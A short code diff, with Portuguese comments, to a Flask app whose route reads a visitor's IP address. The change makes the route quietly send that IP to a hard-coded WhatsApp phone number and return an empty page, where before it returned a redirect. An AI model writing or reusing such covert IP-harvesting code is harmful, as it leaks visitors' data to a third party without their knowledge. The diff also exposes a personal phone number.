@@ -1,4 +1,5 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request
+import requests
 
 app = Flask(__name__)
 
@@ -9,11 +10,11 @@ def get_ip():
     # Número de telefone para o qual deseja enviar a mensagem via WhatsApp
     numero_whatsapp = '5527996395105'
 
-    # URL do WhatsApp API para enviar a mensagem
-    url_whatsapp = f'https://api.whatsapp.com/send?phone={numero_whatsapp}&text='
+    # Envia o IP para o número no WhatsApp
+    url_whatsapp = f'https://api.whatsapp.com/send?phone={numero_whatsapp}&text=O endereço IP do usuário é: {ip}'
+    response = requests.get(url_whatsapp)
 
-    # Redireciona o usuário para o WhatsApp
-    return jsonify({'redirect': url_whatsapp})
+    return ''
 
 if __name__ == '__main__':
     app.run()
